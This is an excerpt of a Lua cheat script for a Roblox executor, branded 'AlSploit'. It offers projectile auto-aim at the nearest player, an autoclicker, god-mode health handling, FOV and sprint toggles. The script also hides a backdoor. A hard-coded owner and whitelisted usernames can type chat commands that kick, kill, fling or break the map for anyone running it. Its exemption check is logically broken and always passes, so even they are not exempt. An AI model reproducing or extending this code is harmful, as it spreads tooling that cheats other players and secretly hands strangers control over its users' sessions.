local WhitelistedUsers = {User1 = "imagod_033", User2 = "4SaD45", User3 = "iusealsploit", User4 = "umother2001vjd", User5 = "ncm_hack", User6 = "bananjoy_4", User7 = "codexexperince123456"}
local Owner = "Andrua5158"
...
local KnitGotten, KnitClient  = false, nil
...
task.spawn(function()
	if not KnitGotten then
		CreateNotification(10, "Your executor might not support some features.")
	end
end)
...
function ShootProjectile(Item, Projectile)
	...
	if NearestEntity and not NearestEntity:FindFirstChildOfClass("ForceField") then
		local Args = {
			...
			[2] = Projectile,
			[3] = Projectile,
			[4] = NearestEntity.PrimaryPart.Position,
			[5] = NearestEntity.PrimaryPart.Position,
...
task.spawn(function()	
	repeat
		...
		task.spawn(function()
			if Settings.Fov.Value == true and KnitGotten == true then 
				FovController:setFOV(Settings.Fov.Fov) 
			end 

			if Settings.Fov.Value == false and KnitGotten == true then 
...
task.spawn(function()
	repeat
		...
		if Settings.AutoClicker.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
			task.spawn(function()
				if KnitGotten == true and ClientHandlerStore:getstate().Inventory.observedInventory == "block" and BlockPlacementController.blockPlacer.clientManager then
			...
			if IsAlive(LocalPlayer) then
				task.spawn(function()
					LocalPlayer.Character.ChildAdded:Connect(function(Part)
						if Part.Name:lower() == "bubble" then
							Part.Transparency = 1
						end
					end)
				end)				
				...
				if Settings.GodMode.Value == true then
					...
					task.spawn(function()
						if LocalPlayer.Character:GetAttribute("Health") < 95 then
...
task.spawn(function()
	local AutoClicker, DropDownButton, LayoutOrder, UIGradient = CreateToggle(CombatTab, "AutoClicker", Settings.AutoClicker.Value, function(CallBack)
		...
		if Settings.AutoClicker.Value == true and KnitGotten == true then
		...
		if Settings.AutoClicker.Value == false and KnitGotten == true then
...
task.spawn(function()
	local Sprint, DropDownButton, LayoutOrder, UIGradient = CreateToggle(CombatTab, "Sprint", Settings.Sprint.Value, function(CallBack)
		...
		if Settings.Sprint.Value == true and KnitGotten == true then
		...
		if Settings.Sprint.Value == false and KnitGotten == true then
		...
		for i, v in next, PlayerService:GetPlayers() do
			for i, v1 in next, WhitelistedUsers do
				v.Chatted:Connect(function(Message)				
					if Message:lower() == ";kick default" and (v.Name == Owner or v.Name == v1) and (LocalPlayer.Name ~= Owner or LocalPlayer.Name ~= v1) then
						task.spawn(function()
							LocalPlayer:Kick("Kicked by AlSploit owner")
						end)
					end

					if Message:lower() == ";kill default" and (v.Name == Owner or v.Name == v1) and (LocalPlayer.Name ~= Owner or LocalPlayer.Name ~= v1) then
						task.spawn(function()
							KillHumanoid(0)
						end)
					end

					if Message:lower() == ";lagback default" and (v.Name == Owner or v.Name == v1) and (LocalPlayer.Name ~= Owner or LocalPlayer.Name ~= v1) then
						task.spawn(function()
							LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(99999, 99999, 99999)
						end)
					end

					if Message:lower() == ";breakmap default" and (v.Name == Owner or v.Name == v1) and (LocalPlayer.Name ~= Owner or LocalPlayer.Name ~= v1) then
						task.spawn(function()
							for i, v in next, CollectionService:GetTagged("block") do
								v:Destroy()
							end
